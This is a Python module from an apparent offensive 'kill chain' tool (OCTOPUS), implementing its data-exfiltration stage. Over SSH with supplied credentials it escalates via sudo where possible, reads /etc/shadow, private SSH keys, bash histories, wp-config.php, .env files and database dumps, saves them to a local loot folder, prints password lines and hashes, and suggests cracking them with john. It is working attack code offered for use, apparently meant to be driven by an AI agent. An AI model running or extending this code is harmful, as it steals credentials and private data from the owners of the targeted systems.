#!/usr/bin/env python3
"""

Stage 8: Data exfiltration.
"""

import os
import re
import time
import socket
import shutil
import subprocess
import concurrent.futures

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_wordlist, find_all_wordlists
except ImportError:
    CFG = {}
    def find_wordlist(cat): return ""
    def find_all_wordlists(cat): return []

from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec

# ANSI Colors
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_GREY   = "\033[90m"
C_BLUE   = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET  = "\033[0m"


# ═══════════════════════════════════════════════
# PARAMIKO SSH HELPERS (shared across stages)
# ═══════════════════════════════════════════════


def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
    """
    Automated data exfiltration.
    Dumps sensitive files: shadow, SSH keys, DB credentials, configs.
    Stores locally in /tmp/octopus_exfil_<target>/
    """
    print(f"\n  {C_RED}[KILL CHAIN] Stage 6: Data Exfiltration — {user}@{host}{C_RESET}")
    output = f"[KILL CHAIN — DATA EXFILTRATION — {user}@{host}:{port}]\n{'═' * 60}\n\n"

    client, err = _ssh_connect(host, user, password, port)
    if err:
        return output + f"[!] SSH connection failed: {err}\n"

    # Create persistent loot directory (not /tmp/ — survives reboots)
    loot_base = os.path.expanduser("~/OCTOPUS/loot")
    exfil_dir = os.path.join(loot_base, host.replace('.', '_'))
    os.makedirs(exfil_dir, exist_ok=True)
    print(f"    {C_CYAN}[*] Loot directory: {exfil_dir}{C_RESET}")

    exfil_files = []

    try:
        # v4.2: Check access level first
        whoami = _ssh_exec(client, "id", timeout=5)
        is_root = "uid=0" in whoami
        can_sudo = False
        if not is_root:
            sudo_check = _ssh_exec(client, "sudo -n id 2>/dev/null", timeout=5)
            can_sudo = "uid=0" in sudo_check

        if is_root:
            print(f"    {C_GREEN}[+] Running as ROOT — full access{C_RESET}")
        elif can_sudo:
            print(f"    {C_YELLOW}[+] Can sudo — will use sudo for restricted files{C_RESET}")
        else:
            print(f"    {C_YELLOW}[!] Non-root, no sudo — some files will be inaccessible{C_RESET}")

        # Files to exfiltrate — split by access level
        base_targets = [
            ("/etc/passwd", "passwd"),
            ("/etc/ssh/sshd_config", "sshd_config"),
        ]

        root_targets = [
            ("/etc/shadow", "shadow"),
            ("/root/.bash_history", "root_history"),
            ("/root/.ssh/id_rsa", "root_ssh_key"),
            ("/root/.ssh/authorized_keys", "root_authorized_keys"),
        ]

        # v4.2: User-home targets (always accessible)
        user_home_targets = [
            (f"/home/{user}/.bash_history", f"{user}_history"),
            (f"/home/{user}/.ssh/id_rsa", f"{user}_ssh_key"),
            (f"/home/{user}/.ssh/authorized_keys", f"{user}_authorized_keys"),
            (f"/home/{user}/.ssh/known_hosts", f"{user}_known_hosts"),
        ]

        targets = base_targets + user_home_targets
        if is_root or can_sudo:
            targets += root_targets

        # Dynamic targets based on what's found
        # Find wp-config files
        wp_configs = _ssh_exec(client, "find / -name 'wp-config.php' 2>/dev/null | head -5", timeout=10)
        for line in wp_configs.splitlines():
            f = line.strip()
            if f:
                targets.append((f, f"wp_config_{f.replace('/', '_')}"))

        # Find .env files
        env_files = _ssh_exec(client, "find /var/www /opt /home -name '.env' 2>/dev/null | head -10", timeout=10)
        for line in env_files.splitlines():
            f = line.strip()
            if f:
                targets.append((f, f"env_{f.replace('/', '_')}"))

        # Find SSH keys
        ssh_keys = _ssh_exec(client, "find / -name id_rsa -o -name id_ed25519 2>/dev/null | head -10", timeout=10)
        for line in ssh_keys.splitlines():
            f = line.strip()
            if f:
                targets.append((f, f"ssh_key_{f.replace('/', '_')}"))

        # Find database dumps
        db_files = _ssh_exec(client, "find / -name '*.sql' -o -name '*.dump' -o -name '*.db' 2>/dev/null | head -10", timeout=10)
        for line in db_files.splitlines():
            f = line.strip()
            if f:
                targets.append((f, f"db_{f.replace('/', '_')}"))

        # Exfiltrate each file
        for remote_path, local_name in targets:
            print(f"    {C_GREY}[→] {remote_path}...{C_RESET}", end="", flush=True)

            # v4.2: Try direct read first, then sudo if non-root
            content = _ssh_exec(client, f"cat {remote_path} 2>&1", timeout=10)

            # Check for actual failures and try sudo fallback
            if content and ("Permission denied" in content or "cannot open" in content.lower()):
                if can_sudo and not is_root:
                    content = _ssh_exec(client, f"sudo cat {remote_path} 2>&1", timeout=10)
                    if content and "Permission denied" not in content and "No such file" not in content and "[!]" not in content:
                        print(f" {C_GREEN}✓ {len(content)}B (via sudo){C_RESET}")
                    else:
                        # v4.2: Show WHY it failed
                        reason = "permission denied" if "Permission denied" in str(content) else "not found"
                        print(f" {C_YELLOW}✗ ({reason}){C_RESET}")
                        output += f"[-] SKIPPED: {remote_path} — {reason}\n"
                        continue
                else:
                    print(f" {C_YELLOW}✗ (permission denied, no sudo){C_RESET}")
                    output += f"[-] SKIPPED: {remote_path} — permission denied (non-root, no sudo)\n"
                    continue
            elif not content or "No such file" in content or "[!]" in content:
                print(f" {C_GREY}— (not found){C_RESET}")
                continue
            else:
                print(f" {C_GREEN}✓ {len(content)}B{C_RESET}")

            # Save successfully read content
            local_path = os.path.join(exfil_dir, local_name)
            with open(local_path, "w") as f:
                f.write(content)
            exfil_files.append({"remote": remote_path, "local": local_path, "size": len(content)})
            output += f"[+] EXFIL: {remote_path} → {local_path} ({len(content)} bytes)\n"

            # Show interesting content inline
            if "shadow" in local_name and "root:" in content:
                output += f"    Shadow hashes:\n"
                for line in content.splitlines()[:10]:
                    if ":" in line and "$" in line:
                        parts = line.split(":")
                        output += f"      {parts[0]}: {parts[1][:40]}...\n"
                        print(f"      {C_RED}  {parts[0]}: {parts[1][:30]}...{C_RESET}")
            elif "PRIVATE KEY" in content:
                output += f"    ← PRIVATE KEY CAPTURED\n"
                print(f"      {C_RED}  ← SSH PRIVATE KEY FOUND{C_RESET}")
            elif "DB_PASSWORD" in content or "password" in content.lower():
                output += f"    ← CREDENTIALS in file\n"
                # v4.2: Show actual password lines
                for line in content.splitlines():
                    if any(kw in line.lower() for kw in ['password', 'passwd', 'secret', 'token', 'api_key', 'db_pass']):
                        print(f"      {C_RED}  {line.strip()[:100]}{C_RESET}")
                        output += f"    → {line.strip()[:100]}\n"

        # ── Hash cracking assessment ─────────────────────────────
        shadow_path = os.path.join(exfil_dir, "shadow")
        if os.path.isfile(shadow_path):
            output += "\n[HASH CRACKING ASSESSMENT]\n"
            with open(shadow_path) as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 2 and parts[1] and parts[1] not in ("*", "!", "!!", "x"):
                        hash_val = parts[1]
                        hash_type = "unknown"
                        if hash_val.startswith("$6$"):
                            hash_type = "SHA-512"
                        elif hash_val.startswith("$5$"):
                            hash_type = "SHA-256"
                        elif hash_val.startswith("$1$"):
                            hash_type = "MD5"
                        elif hash_val.startswith("$y$"):
                            hash_type = "yescrypt"
                        elif hash_val.startswith("$2"):
                            hash_type = "bcrypt"
                        output += f"  {parts[0]}: {hash_type} hash\n"

            # Try cracking with john if available
            if shutil.which("john"):
                output += "\nAI: Run john offline: john --wordlist=/usr/share/wordlists/rockyou.txt " + shadow_path + "\n"

        output += f"\n{'═' * 60}\n"
        output += f"Files exfiltrated: {len(exfil_files)}\n"
        output += f"Exfil directory: {exfil_dir}\n"
        total_size = sum(f["size"] for f in exfil_files)
        output += f"Total data: {total_size:,} bytes\n"

        # Generate target report
        # NOTE: _generate_target_report imported lazily inside data_exfil() to avoid
        # circular import (orchestrator → exfil → orchestrator)
        from core.killchain.orchestrator import _generate_target_report
        _generate_target_report(host, user, exfil_dir, exfil_files, output)

    finally:
        client.close()

    return output


# ═══════════════════════════════════════════════
# FULL KILL CHAIN ORCHESTRATOR
# ═══════════════════════════════════════════════


